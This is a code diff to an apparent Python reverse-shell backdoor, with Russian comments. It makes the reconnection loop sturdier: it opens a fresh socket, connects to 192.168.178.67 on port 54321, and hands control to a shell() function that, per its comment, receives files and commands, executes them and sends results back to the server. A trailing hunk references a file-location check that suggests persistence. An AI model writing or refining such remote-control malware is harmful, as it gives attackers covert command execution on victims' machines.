@@ -26,14 +26,17 @@ def reliable_recv():
 
 #повторное подключение
 def connection():
-        while True:
-                time.sleep(20)
-                try:
-                        sock.connect(("192.168.178.67", 54321))
-                        shell()
-                        break
-                except:
-                        time.sleep(5)
+    global sock
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect(("192.168.178.67", 54321))
+            print("[+] Подключение установлено")
+            shell()
+            break  # Выход из цикла после успешного подключения
+        except socket.error:
+            print("[!] Не удалось подключиться к серверу. Повтор через 5 секунд...")
+            time.sleep(5)
 
 #получает файлы, команды, выполняет и потом отправляет результаты на сервер
 def shell():
@@ -80,6 +83,6 @@ if not os.path.exists(location):
         except Exception as e:
                 pass
 
-sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+sock = None
 connection()
 sock.close()
